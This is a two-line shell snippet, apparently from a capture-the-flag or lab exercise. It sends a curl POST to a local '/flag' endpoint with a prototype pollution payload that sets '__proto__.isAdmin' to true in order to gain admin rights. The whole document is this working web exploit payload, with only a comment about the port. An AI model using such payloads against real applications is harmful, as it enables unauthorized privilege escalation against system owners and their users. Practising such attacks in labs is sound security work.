# Have to make sure what the port is
curl -X POST http://localhost:9090/flag -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin": true}}'